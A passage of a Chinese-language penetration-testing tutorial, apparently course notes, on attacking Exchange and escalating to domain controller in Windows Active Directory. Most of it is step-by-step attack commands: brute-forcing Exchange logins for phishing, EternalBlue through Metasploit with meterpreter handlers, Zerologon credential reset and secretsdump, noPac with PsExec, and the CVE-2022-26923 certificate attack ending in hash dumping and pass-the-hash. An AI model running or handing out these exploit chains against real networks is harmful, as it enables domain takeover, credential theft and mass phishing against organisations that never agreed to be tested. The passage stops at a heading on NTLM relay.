 Exchange 会对外暴露接口如 OWA,ECP 等，会暴露在 80 端口，而且 25/587/2525 等端口上会有 SMTP 服务，所以可以通过一些端口特征来定位 exchange。&lt;/p&gt;
&lt;p&gt;（ 2 ）SPN 扫描&lt;br&gt;
 &lt;code&gt;powershell setspn -T 0day.org -q */*&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（ 3 ）脚本探针版本并探测可能存在的 CVE&lt;br&gt;
 &lt;code&gt;python Exchange_GetVersion_MatchVul.py xx.xx.xx.xx&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Exchange 爆破&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;爆破账户密码进行登录 exchange 方便钓鱼，账户密码都是通过搜索凭证中获取。&lt;/p&gt;
&lt;p&gt;Burp+Proxifier：直接将 web 流量捕获通过 burp 来爆破账户名和密码&lt;br&gt;
工具链接 1：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2dyYXlkZHEvRUJ1cnN0&#34;&gt;https://github.com/grayddq/EBurst&lt;/span&gt;&lt;br&gt;
 工具链接 2：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xhemFhcnMvTWFpbFNuaXBlcg==&#34;&gt;https://github.com/lazaars/MailSniper&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Exchange 漏洞&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlhb3ppL3AvMTQ0ODE1OTUuaHRtbA==&#34;&gt; https://www.cnblogs.com/xiaozi/p/14481595.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;确定内核版本 - 筛选 Server 版本 - 确定漏洞对应关系 - 选择漏洞进行漏洞，如 CVE-2020-0688 CVE-2020-17144，主要是为了控制 exchange 服务器，一旦控制 到服务器可以大规模邮件钓鱼，寻找相应 exchange 版本存在何种漏洞，搜素利 用脚本进行利用。&lt;/p&gt;
&lt;h3 id=&#34;域控提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域控提权&#34;&gt;#&lt;/a&gt; 域控提权&lt;/h3&gt;
&lt;h4 id=&#34;ms17010cve-2017-0146&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms17010cve-2017-0146&#34;&gt;#&lt;/a&gt; MS17010（CVE-2017-0146）&lt;/h4&gt;
&lt;p&gt;除去前述的口令传递的攻击方式之外，还可以从系统漏洞层面进行漏洞利用，如 CVE-2017-0146, 适用版本 Windows 7 8.1 10; Windows Server 2008 2 012 2016; 先如今，多数电脑已经配置上了补丁。由于 cs 只支持漏洞扫描，msf 支持漏洞利用，因此可以利用 msf 联动 cs 检测并利用。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CS创建外联监听器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;选择外围http的方式，并命名为msf，输入命令spawn msf，将当前主机的权限移交给msf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf运行ms 17010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF监听联动配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 8888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加路由&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p //查看当前路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/manage/autoroute //添加当前路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检测是否存在 17010 漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/scanner/smb/smb_ms17_010&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.3.21-32 //设置扫描目标段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set threads 5 //设置扫描线程数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用模块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/ms17_010_eternalblue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/bind_tcp //目标不出网用正向连接上线&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhost 192.168.3.25 //设置连接目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.3.25 //设置扫描目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ms14-068-cve-2014-6324&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ms14-068-cve-2014-6324&#34;&gt;#&lt;/a&gt; MS14-068 (CVE-2014-6324)&lt;/h4&gt;
&lt;p&gt;见前面 PTT 横向移动课程演示&lt;/p&gt;
&lt;h4 id=&#34;cve-2020-1472&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2020-1472&#34;&gt;#&lt;/a&gt; CVE-2020-1472&lt;/h4&gt;
&lt;p&gt;适用 Windows Server 2008、2012、2016 、2019 等。需要先建立 socket 代理端口，将流量转发至公网上，并修改 hosts 文件保证域名解析正确。&lt;/p&gt;
&lt;p&gt;重置密码：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=&#34;&gt;https://github.com/dirkjanm/CVE-2020-1472&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取计算机名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nbtscan -v -h 192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接DC清空凭证&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python cve- 2020 - 1472 - exploit.py OWA20N-GOD 192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取域内HASH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxychains python secretsdump.py OWA2010CN-GOD\$@192.168.3.21 -just-dc -no-pass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;连接域控PTH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;后续恢复密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/risksense/zerologon&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/SecureAuthCorp/impacket&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cve-2021-42287&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2021-42287&#34;&gt;#&lt;/a&gt; CVE-2021-42287&lt;/h4&gt;
&lt;p&gt;需要一个域内普通账号，可以影响 Windows 基本全系列。&lt;/p&gt;
&lt;p&gt;（ 1 ）参考项目地址：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvbm9QYWM=&#34;&gt;https://github.com/cube0x0/noPac&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3N5c2ludGVybmFscy9kb3dubG9hZHMvcHN0b29scw==&#34;&gt;https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 2 ）漏洞利用流程：&lt;br&gt;
代理后：修改 Host 绑定域名和 IP&lt;br&gt;
 扫描探针： &lt;code&gt;noPac scan -domain god.org -user webadmin -pass admin!@#45&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;（ 3 ）利用漏洞&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个和目标通讯的票据：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用psexec弹出cmd窗口：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PsExec \\owa2010cn-god.god.org cmd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以利用python的以下脚本执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;https://github.com/WazeHell/sam-the-admin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python sam_the_admin.py god/&amp;#x27;webadmin:admin!@#45&amp;#x27; -dc-ip 192.168.3.21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cve-2022-26923&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2022-26923&#34;&gt;#&lt;/a&gt; CVE-2022-26923&lt;/h4&gt;
&lt;p&gt;当 Windows 系统的 Active Directory 证书服务 (CS) 在域上运行时，由于 机器账号中的 dNSHostName 属性不具有唯一性，域中普通用户可以将其更改为 高权限的域控机器账号属性，然后从 Active Directory 证书服务中获取域控机器 账户的证书，导致域中普通用户权限提升为域管理员权限。影响 Win8.1、Win1 0、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022 等版本。&lt;/p&gt;
&lt;p&gt;（ 1 ）前提条件：&lt;br&gt;
一个域内普通账号、域内存在证书服务器 ，可以用 certutial -config -ping 可以判断，如果报错则不存在证书服务器，如果提示其他信息则说明存在，也 可以用 spn 检测。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. Kali添加访问域内信息 /etc/hosts&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.1.15 xiaodi.local xiaodi-WIN-3C7SS32SQ6R-CAWIN-3C7SS32SQ6 R.xiaodi.local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 获取CA结构名和计算机名&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certutil -config - - ping&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 域内信息: 192.168.1.15 &lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt; Pass123&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xiaodi-WIN-3C7SS32SQ6R-CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WIN-3C7SS32SQ6R.xiaodi.local&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 2 ）漏洞利用步骤&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 申请低权限用户证书：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy req &amp;#x27;xiaodi.local/test:Pass123@WIN-3C7SS32SQ6R.xiaodi.local&amp;#x27; -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 检测证书:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy auth -pfx test.pfx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 创建一个机器账户：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 bloodyAD.py -d xiaodi.local -u test -p &amp;#x27;Pass123&amp;#x27; --host 192.168.1.15 addComputer pwnmachine &amp;#x27;CVEPassword1234*&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;d. 设置机器账户属性(dNSHostName和DC一致)：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 bloodyAD.py -d xiaodi.local -u test -p &amp;#x27;Pass123&amp;#x27; --host 192.168.1.15 setAttribute &amp;#x27;CN=pwnmachine,CN=Computers,DC=xiaodi,DC=local&amp;#x27; dNSHostName &amp;#x27;[&amp;quot;WIN-3C7SS32SQ6R.xiaodi.local&amp;quot;]&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;e. 再次申请证书：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy req &amp;#x27;xiaodi.local/pwnmachine$:CVEPassword1234*@192.168.1.15&amp;#x27; -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;f. 检测证书：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;certipy auth -pfx ./win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;g. 导出HASH：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 secretsdump.py &amp;#x27;xiaodi.local/win-3c7ss32sq6r$@WIN-3C7SS32SQ6R.xiaodi.local&amp;#x27; -hashes :10e02bef2258ad9b239e2281a01827a4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;h. 利用HASH：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 wmiexec.py xiaodi.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;其他横向手段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他横向手段&#34;&gt;#&lt;/a&gt; 其他横向手段&lt;/h3&gt;
&lt;h4 id=&#34;ntlm-relay-重放&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlm-relay-重放&#34;&gt;#&lt;/a&gt; NTLM Relay 重放&lt;/h4&gt;
